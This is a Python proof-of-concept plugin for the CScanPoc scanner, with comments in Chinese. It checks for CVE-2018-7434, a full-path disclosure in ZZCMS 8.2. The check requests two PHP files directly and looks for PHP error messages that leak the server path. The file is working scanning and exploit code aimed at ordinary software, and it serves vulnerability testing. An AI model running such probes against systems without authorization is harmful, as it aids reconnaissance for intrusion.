# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ZZCMS_0005'  # 平台漏洞编号，留空
    name = 'ZZCMS信息泄露漏洞'  # 漏洞名称
    level = VulnLevel.MED   # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-02-27'  # 漏洞公布时间
    desc = '''
        ZZCMS是一款集成app移动平台与电子商务平台的内容管理系统。
        ZZCMS 8.2版本中存在安全漏洞。远程攻击者可通过向3/qq_connect2.0/API/class/ErrorCase.class.php或3/ucenter_api/code/friend.php文件发送直接请求利用该漏洞获取完整路径。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-05863'  # 漏洞来源
    cnvd_id = 'CNVD-2018-05863'  # cnvd漏洞编号
    cve_id = 'CVE-2018-7434'  # cve编号
    product = 'ZZCMS'  # 漏洞应用名称
    product_version = '8.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5df07064-b01e-4668-8753-5c2612c86807'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/3/qq_connect2.0/API/class/ErrorCase.class.php'
            url = self.target + payload
            r = requests.get(url)

            if "Failed opening required" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            payload = '/3/ucenter_api/code/friend.php'
            url = self.target + payload
            r = requests.get(url)

            if "Call to undefined function" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
